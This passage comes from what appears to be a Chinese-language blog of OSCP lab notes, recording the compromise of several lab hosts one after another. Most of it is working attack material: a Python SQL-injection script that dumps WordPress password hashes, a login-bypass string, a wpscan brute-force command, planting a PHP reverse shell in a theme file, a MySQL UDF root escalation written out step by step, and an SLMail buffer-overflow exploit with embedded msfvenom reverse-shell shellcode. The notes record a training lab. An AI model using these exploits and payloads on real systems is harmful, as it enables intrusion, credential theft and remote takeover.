class="line">sh-3.2# ls</span><br><span class="line">ls</span><br><span class="line">install.log  install.log.syslog  proof.txt</span><br><span class="line">sh-3.2# cat proof.txt</span><br><span class="line">cat proof.txt</span><br><span class="line">ffb5d84a211ae8398d6ae474f2242af3</span><br></pre></td></tr></table></figure></p>
<h2 id="10-11-1-227"><a href="#10-11-1-227" class="headerlink" title="10.11.1.227"></a>10.11.1.227</h2><p>nmap(行數快不夠了所以貼圖)<br><img src="https://i.imgur.com/C9AGLmH.png" alt=""><br>windows 2000 445 open:<br><img src="https://i.imgur.com/dC5aSKz.png" alt=""><br>直接拿其他台的POC來用…<br><img src="https://i.imgur.com/addw4pk.png" alt=""></p>
<p><img src="https://i.imgur.com/s0QaW7f.png" alt=""></p>
<p><img src="https://i.imgur.com/WuJy0Qy.png" alt=""></p>
<h2 id="10-11-1-229"><a href="#10-11-1-229" class="headerlink" title="10.11.1.229(*)"></a>10.11.1.229(*)</h2><p>80 port之後發現有開webdav，IIS 6.0 應該靠這個了<br><img src="https://i.imgur.com/UWmSYS3.png" alt=""><br>先搞shell<br><img src="https://i.imgur.com/QUhBESh.png" alt=""><br>上傳的話，無法像上次一樣就是先傳txt再改asp<br><img src="https://i.imgur.com/uFfuvfY.png" alt=""><br>這次用新的方法<br><img src="https://i.imgur.com/XvL4KRT.png" alt=""></p>
<p><img src="https://i.imgur.com/ahYyk7T.png" alt=""><br><img src="https://i.imgur.com/rRfaQMK.png" alt=""></p>
<p>跑了<code>systeminfo</code>之後得知是windows server 2003 sp1<br>EXPLOITDB:<br><a href="https://www.exploit-db.com/exploits/6705" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/6705</a><br>因為exploitdb上抓下來的是source code<br>所以我又另外去外面抓了exe<br><a href="https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco" target="_blank" rel="noopener">https://github.com/jivoi/pentest/blob/master/exploit_win/churrasco</a><br>我們先把exe改名成txt再丟上去，然後copy到temp改成exe<br><img src="https://i.imgur.com/4RPjCvK.png" alt=""><br><img src="https://i.imgur.com/yXWVHem.png" alt=""></p>
<p><img src="https://i.imgur.com/X9amOBZ.png" alt=""><br>這邊卡了一下<br>我不知道為什麼我用<code>churrasco.exe</code> 跑完nc後他聽不到<br>還要我在手動跑一次nc並且exit後才聽到QQ，不過總之結果就是這樣<br>那個nc是我自己上傳的，相同手法就不再演示了</p>
<h2 id="10-11-1-230"><a href="#10-11-1-230" class="headerlink" title="10.11.1.230"></a>10.11.1.230</h2><p>80 PORT 的畫面:</p>
<p><img src="https://i.imgur.com/uiLcrF2.png" alt=""></p>
<p>餵狗後看到此POC:</p>
<p><a href="https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py" target="_blank" rel="noopener">https://github.com/Muhammd/HP-Power-Manager/blob/master/hpm_exploit.py</a></p>
<p>照個上面稍微改一下POC<br><img src="https://i.imgur.com/XJ7GZgX.png" alt=""></p>
<p>然後就拿到root了<br><img src="https://i.imgur.com/qh3xZZh.png" alt=""></p>
<p>還順便拿到一個network-secret<br><img src="https://i.imgur.com/5v9GB8Z.png" alt=""></p>
<h2 id="10-11-1-234"><a href="#10-11-1-234" class="headerlink" title="10.11.1.234"></a>10.11.1.234</h2><p>nmap<br><img src="https://i.imgur.com/PqyRzaB.png" alt=""></p>
<p>那個<code>CoreHTTP httpd 0.5.3.1</code>好像是rabbit hole<br>80 port:<br><img src="https://i.imgur.com/jLZbAQH.png" alt=""><br><code>wpscan -e --url http://10.11.1.234</code><br><img src="https://i.imgur.com/1D6nLGE.png" alt=""><br>在<code>wp-admin</code>嘗試了admin/admin沒用<br>直接用wpscan可以爆破<br><code>wpscan --url http://10.11.1.234/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin</code><br><img src="https://i.imgur.com/JsLJ0Ky.png" alt=""></p>
<p>登入後照這個做法<br><a href="https://hackingnewideas.wordpress.com/2014/01/02/how-to-upload-shell-in-wordpress-sites/" target="_blank" rel="noopener">https://hackingnewideas.wordpress.com/2014/01/02/how-to-upload-shell-in-wordpress-sites/</a><br><img src="https://i.imgur.com/Sgou1B7.png" alt=""><br>把我們的php-reverse-shell貼上去</p>
<p>之後再進去<br><code>http://10.11.1.234/wp-content/themes/twentytwelve/404.php</code><br>就能拿到shell了<br><img src="https://i.imgur.com/tSxPD2q.png" alt=""></p>
<p>確認過有python和gcc之後下<code>uname -a</code><br>得知是<code>Linux core 2.6.32-21-generic-pae #32-Ubuntu SMP Fri Apr 16 09:39:35 UTC 2010 i686 GNU/Linux</code><br>看到2.6我第一個想到dirtycow<br><a href="https://www.exploit-db.com/exploits/40839" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40839</a><br><img src="https://i.imgur.com/H3TcRR9.png" alt=""><br>一樣執行完重連進去<br><img src="https://i.imgur.com/sJ0KymZ.png" alt=""></p>
<h2 id="10-11-1-251"><a href="#10-11-1-251" class="headerlink" title="10.11.1.251 (*)"></a>10.11.1.251 (*)</h2><p>nmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 00:45 CST</span><br><span class="line">Nmap scan report for 10.11.1.251</span><br><span class="line">Host is up (0.38s latency).</span><br><span class="line">Not shown: 65533 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.1p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 fd:35:c0:66:fc:2a:d0:76:c0:33:55:21:cb:70:55:54 (DSA)</span><br><span class="line">|_  2048 bf:e1:ee:61:60:a5:3d:28:0f:af:7d:85:0c:19:c5:8d (RSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.11 ((Ubuntu) PHP/5.2.6-3ubuntu4.4 with Suhosin-Patch)</span><br><span class="line">|_http-server-header: Apache/2.2.11 (Ubuntu) PHP/5.2.6-3ubuntu4.4 with Suhosin-Patch</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">MAC Address: 00:50:56:B8:91:1C (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|printer|broadband router|switch|remote management|firewall|phone|security-misc</span><br><span class="line">Running (JUST GUESSING): Linux 2.6.X|3.X (92%), Canon embedded (89%), D-Link embedded (89%), Extreme Networks ExtremeXOS 12.X (89%), HP embedded (89%), Barracuda Networks embedded (89%), Linksys embedded (87%), Nokia Symbian OS (87%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/h:canon:imagerunner_advance_c5051 cpe:/h:dlink:dsl-2540b cpe:/o:extremenetworks:extremexos:12.5.4 cpe:/a:hp:onboard_administrator:2.04 cpe:/h:linksys:wrv200 cpe:/o:nokia:symbian_os cpe:/o:linux:linux_kernel:3.2.0</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (92%), Linux 2.6.23 (90%), Linux 2.6.22 (Debian 4.0) (90%), Linux 2.6.24 (Debian) (90%), Linux 2.6.26 (90%), Canon imageRUNNER ADVANCE C5051 printer (89%), D-Link DSL-2540B ADSL router (89%), Extreme Networks ExtremeXOS 12.5.4 (89%), HP Onboard Administrator 2.04 (89%), HP Onboard Administrator 2.25 - 3.31 (89%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 529.46 seconds</span><br></pre></td></tr></table></figure>
<p>gobuster:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.11.1.251/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/02/23 00:45:35 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/cgi-bin/ (Status: 403)</span><br><span class="line">/index (Status: 200)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/latest (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/wp (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/02/23 00:48:35 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
<p>是wordpress<br><img src="https://i.imgur.com/RLRQO4g.png" alt=""></p>
<p>wpscan之後發現了有趣的東西</p>
<p><img src="https://i.imgur.com/cvsB05l.png" alt=""></p>
<p><img src="https://i.imgur.com/LtRjFNH.png" alt=""></p>
<p>wordpress本身的洞太多了<br>先從 plugin開始看起</p>
<p>在目錄頁面隨便搓一搓後進到這:<br><img src="https://i.imgur.com/D77X5l0.png" alt=""></p>
<p>WP-Forum 2.3 有一個 SQLi 的洞<br><a href="https://www.exploit-db.com/exploits/10488" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/10488</a></p>
<p>再進一步看</p>
<p><img src="https://i.imgur.com/dL3VTIQ.png" alt=""></p>
<p>對應的 exploit url 也找到了</p>
<p>exploit code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &apos;http://10.11.1.251/wp/?p=5&amp;wpforumaction=search&apos;</span><br><span class="line">values = &#123;&apos;search_words&apos; : &apos;any&apos;,</span><br><span class="line">          &apos;search_submit&apos; : &apos;Search&apos;,</span><br><span class="line">          &apos;search_max&apos; : &apos;999 DAY) union select 1,1,1,user_pass,1,1,1 from wp_users where id=1 or SUBDATE(CURDATE(), INTERVAL 9999&apos; &#125;</span><br><span class="line"></span><br><span class="line">data = urllib.urlencode(values)</span><br><span class="line">req = urllib2.Request(url, data)</span><br><span class="line">response = urllib2.urlopen(req)</span><br><span class="line">output = response.read()</span><br><span class="line">o = re.search(&apos;viewtopic.+&gt;([$].+)&lt;&apos;,output)</span><br><span class="line">if o:</span><br><span class="line">        print o.group(1)</span><br></pre></td></tr></table></figure>
<p>結果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/oscp/10.11.1.251# python exp.py </span><br><span class="line">$P$B9wJdX0NkO95U2L.kqAGXsFufwSp5N1</span><br></pre></td></tr></table></figure></p>
<p>hashcat:<br><img src="https://i.imgur.com/teRSa9V.png" alt=""></p>
<p>一開始我還看傻了眼，但他的pw真的是<code>?????</code></p>
<p><img src="https://i.imgur.com/rSSTuEI.png" alt=""></p>
<h2 id="10-11-1-252"><a href="#10-11-1-252" class="headerlink" title="10.11.1.252"></a>10.11.1.252</h2><p>nmap 掃完後發現有login page<br><img src="https://i.imgur.com/E0Epxol.png" alt=""></p>
<p>使用 <code>&#39; or 1=1 --</code> 可以成功登入</p>
<p><img src="https://i.imgur.com/aizqu0a.png" alt=""></p>
<p>把所有的 user/pass 都試過後，有一個能登入</p>
<p><img src="https://i.imgur.com/thRFUAe.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh j0hn@10.11.1.252 -p 22000</span><br><span class="line">j0hn@10.11.1.252&apos;s password: </span><br><span class="line">Last login: Sun Feb 16 04:07:51 2020 from 10.11.0.39</span><br><span class="line">[j0hn@timeclock ~]$</span><br></pre></td></tr></table></figure>
<p>看到這個:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] MYSQL version:</span><br><span class="line">mysql  Ver 14.12 Distrib 5.0.77, for redhat-linux-gnu (i686) using readline 5.1</span><br></pre></td></tr></table></figure>
<p>還有kernel版本<br><code>Linux timeclock 2.6.18-164.11.1.el5 #1 SMP Wed Jan 20 07:39:04 EST 2010 i686 i686 i386 GNU/Linux</code></p>
<p>嘗試了CVE-2010-3081沒有用</p>
<p>最後才知道MYSQL有cve 可以打</p>
<p><a href="https://www.exploit-db.com/exploits/1518" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/1518</a><br>照著做:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Tables_in_mysql           |</span><br><span class="line">+---------------------------+</span><br><span class="line">| columns_priv              | </span><br><span class="line">| db                        | </span><br><span class="line">| func                      | </span><br><span class="line">| help_category             | </span><br><span class="line">| help_keyword              | </span><br><span class="line">| help_relation             | </span><br><span class="line">| help_topic                | </span><br><span class="line">| host                      | </span><br><span class="line">| proc                      | </span><br><span class="line">| procs_priv                | </span><br><span class="line">| tables_priv               | </span><br><span class="line">| time_zone                 | </span><br><span class="line">| time_zone_leap_second     | </span><br><span class="line">| time_zone_name            | </span><br><span class="line">| time_zone_transition      | </span><br><span class="line">| time_zone_transition_type | </span><br><span class="line">| user                      | </span><br><span class="line">+---------------------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&apos;/tmp/raptor_udf2.so&apos;));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/raptor_udf2.so&apos;;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| name      | ret | dl             | type     |</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| do_system |   2 | raptor_udf2.so | function | </span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(&apos;id &gt; /tmp/out; chown j0hn.j0hn /tmp/out&apos;);</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| do_system(&apos;id &gt; /tmp/out; chown j0hn.j0hn /tmp/out&apos;) |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">|                                           4294967296 | </span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; \! sh</span><br><span class="line">sh-3.2$ cat /tmp/out</span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">sh-3.2$</span><br></pre></td></tr></table></figure></p>
<p>要如果路徑輸入錯的話，建議RESET，因為資料庫亂了</p>
<p>反正我們現在成功的拿到 root shell，再做最後一個步驟</p>
<p>搭配服用<br><a href="http://wg135.github.io/blog/2016/08/12/lord-the-root/" target="_blank" rel="noopener">http://wg135.github.io/blog/2016/08/12/lord-the-root/</a><br>裡面的<br><a href="https://github.com/wg135/script/blob/master/suid.c" target="_blank" rel="noopener">https://github.com/wg135/script/blob/master/suid.c</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select do_system(&apos;gcc /tmp/suid.c -o /tmp/suid&apos;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| do_system(&apos;gcc /tmp/suid.c -o /tmp/suid&apos;) |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">|                                4294967296 | </span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(&apos;chmod u+s /tmp/suid&apos;);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| do_system(&apos;chmod u+s /tmp/suid&apos;) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">|                       4294967296 | </span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/zIjfH7X.png" alt=""><br>還順便拿到一個network-secret<br>記得要用<code>do_system</code>進行compiler才會是root的權限</p>
<p>超…超難</p>
<h2 id="10-11-22-59"><a href="#10-11-22-59" class="headerlink" title="10.11.22.59"></a>10.11.22.59</h2><p>這個是WindowBOF靶機</p>
<p>聽說題目會先幫我們把注入口弄好<br>所以我先弄好</p>
<p><img src="https://i.imgur.com/e4cP8Fs.png" alt=""></p>
<p>imm開起來attach PID 並且run起來<br><img src="https://i.imgur.com/yhTQdn6.png" alt=""><br>跑poc:<br><img src="https://i.imgur.com/nIP8kTg.png" alt=""></p>
<p><img src="https://i.imgur.com/VSKqYD1.png" alt=""><br>可以看到 EIP變成我們的gadget了</p>
<p>因為little endian的緣故我們要從後往前看<br>也就是0x61 0x62 0x61 0x64 -&gt; abad<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/oscp/10.11.22.59# cyclic -l abad</span><br><span class="line">2607</span><br></pre></td></tr></table></figure></p>
<p>現在知道offset之後就好辦了</p>
<p>再來就是找 <code>jmp esp</code><br>切e可以看到name對應的dll<br><img src="https://i.imgur.com/811TpBv.png" alt=""></p>
<p>切到<code>m</code>可以看到load的information<br><img src="https://i.imgur.com/ibKW8ZN.png" alt=""></p>
<p><img src="https://i.imgur.com/g9eVkfe.png" alt=""></p>
<p>我一開始找了<code>slmail.exe</code>看到一個且是start null 且 readonly，就看另一個了<br><img src="https://i.imgur.com/vezsnzb.png" alt=""></p>
<p><img src="https://i.imgur.com/MUMPG73.png" alt=""></p>
<p>隨便找一個來用就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r = remote(&apos;10.11.22.59&apos;, 110)</span><br><span class="line"></span><br><span class="line">gadget = cyclic(3000)</span><br><span class="line">#msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.42 LPORT=443 -b &quot;\x00\x0d\x0a\x0b&quot; -a x86 -f python</span><br><span class="line">buf =  b&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">buf += b&quot;\xdb\xce\xd9\x74\x24\xf4\xb8\x88\x50\xdc\x8a\x5a\x29&quot;</span><br><span class="line">buf += b&quot;\xc9\xb1\x56\x83\xea\xfc\x31\x42\x14\x03\x42\x9c\xb2&quot;</span><br><span class="line">buf += b&quot;\x29\x76\x74\xb0\xd2\x87\x84\xd5\x5b\x62\xb5\xd5\x38&quot;</span><br><span class="line">buf += b&quot;\xe6\xe5\xe5\x4b\xaa\x09\x8d\x1e\x5f\x9a\xe3\xb6\x50&quot;</span><br><span class="line">buf += b&quot;\x2b\x49\xe1\x5f\xac\xe2\xd1\xfe\x2e\xf9\x05\x21\x0f&quot;</span><br><span class="line">buf += b&quot;\x32\x58\x20\x48\x2f\x91\x70\x01\x3b\x04\x65\x26\x71&quot;</span><br><span class="line">buf += b&quot;\x95\x0e\x74\x97\x9d\xf3\xcc\x96\x8c\xa5\x47\xc1\x0e&quot;</span><br><span class="line">buf += b&quot;\x47\x84\x79\x07\x5f\xc9\x44\xd1\xd4\x39\x32\xe0\x3c&quot;</span><br><span class="line">buf += b&quot;\x70\xbb\x4f\x01\xbd\x4e\x91\x45\x79\xb1\xe4\xbf\x7a&quot;</span><br><span class="line">buf += b&quot;\x4c\xff\x7b\x01\x8a\x8a\x9f\xa1\x59\x2c\x44\x50\x8d&quot;</span><br><span class="line">buf += b&quot;\xab\x0f\x5e\x7a\xbf\x48\x42\x7d\x6c\xe3\x7e\xf6\x93&quot;</span><br><span class="line">buf += b&quot;\x24\xf7\x4c\xb0\xe0\x5c\x16\xd9\xb1\x38\xf9\xe6\xa2&quot;</span><br><span class="line">buf += b&quot;\xe3\xa6\x42\xa8\x09\xb2\xfe\xf3\x45\x77\x33\x0c\x95&quot;</span><br><span class="line">buf += b&quot;\x1f\x44\x7f\xa7\x80\xfe\x17\x8b\x49\xd9\xe0\x9a\x5e&quot;</span><br><span class="line">buf += b&quot;\xda\x3f\x24\x0e\x24\xc0\x54\x06\xe3\x94\x04\x30\xc2&quot;</span><br><span class="line">buf += b&quot;\x94\xcf\xc0\xeb\x40\x65\xcb\x7b\x61\x72\xcb\x51\x1d&quot;</span><br><span class="line">buf += b&quot;\x86\xcb\xa4\x66\x0f\x2d\xf6\xc8\x5f\xe2\xb7\xb8\x1f&quot;</span><br><span class="line">buf += b&quot;\x52\x50\xd3\x90\x8d\x40\xdc\x7b\xa6\xeb\x33\xd5\x9e&quot;</span><br><span class="line">buf += b&quot;\x83\xaa\x7c\x54\x35\x32\xab\x10\x75\xb8\x59\xe4\x38&quot;</span><br><span class="line">buf += b&quot;\x49\x28\xf6\x2d\x2e\xd2\x06\xae\xdb\xd2\x6c\xaa\x4d&quot;</span><br><span class="line">buf += b&quot;\x85\x18\xb0\xa8\xe1\x86\x4b\x9f\x72\xc0\xb4\x5e\x42&quot;</span><br><span class="line">buf += b&quot;\xba\x83\xf4\xea\xd4\xeb\x18\xea\x24\xba\x72\xea\x4c&quot;</span><br><span class="line">buf += b&quot;\x1a\x27\xb9\x69\x65\xf2\xae\x21\xf0\xfd\x86\x96\x53&quot;</span><br><span class="line">buf += b&quot;\x96\x24\xc0\x94\x39\xd7\x27\xa7\x3e\x27\xb5\x80\xe6&quot;</span><br><span class="line">buf += b&quot;\x4f\x45\x91\x16\x8f\x2f\x11\x47\xe7\xa4\x3e\x68\xc7&quot;</span><br><span class="line">buf += b&quot;\x45\x95\x21\x4f\xcf\x78\x83\xee\xd0\x50\x45\xae\xd1&quot;</span><br><span class="line">buf += b&quot;\x57\x5e\x41\xab\x18\x61\xa2\x4c\x31\x06\xa3\x4c\x3d&quot;</span><br><span class="line">buf += b&quot;\x38\x98\x9a\x04\x4e\xdf\x1e\x33\x41\x6a\x02\x12\xc8&quot;</span><br><span class="line">buf += b&quot;\x94\x10\x64\xd9&quot;</span><br><span class="line">jmp_esp=0x5F4A358F</span><br><span class="line">payload = &apos;&apos;.ljust(2607, &apos;\x90&apos;)</span><br><span class="line">r.recv(1024)</span><br><span class="line">r.send(&apos;USER username&apos;+ &apos;\r\n&apos;)</span><br><span class="line">r.recv(1024)</span><br><span class="line">#r.send(&apos;PASS&apos; +gadget+ &apos;\r\n&apos;)</span><br><span class="line">r.send(&apos;PASS&apos; + payload + p32(jmp_esp) + buf + &apos;\r\n&apos;)</span><br><span class="line">print &apos;Done!&apos;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgur.com/Bt1QpR9.png" alt=""></p>


                
            </div>

            <!-- Comments -->
            
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    


                </div>
            
        </div>
    </div>
</article>

    <!-- Footer -->
    <hr />

<!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    

                    

                    
                        <li>
                            <a href="https://github.com/sda06407" target="_blank">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    

                    

                    

                    
                </ul>
                <p class="copyright text-muted">&copy; 2020 AStar<br></p>
                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
            </div>
        </div>
    </div>
</footer>


    <!-- After footer scripts -->
    
<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Bootstrap -->
<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Disqus Comments -->



</body>

</html>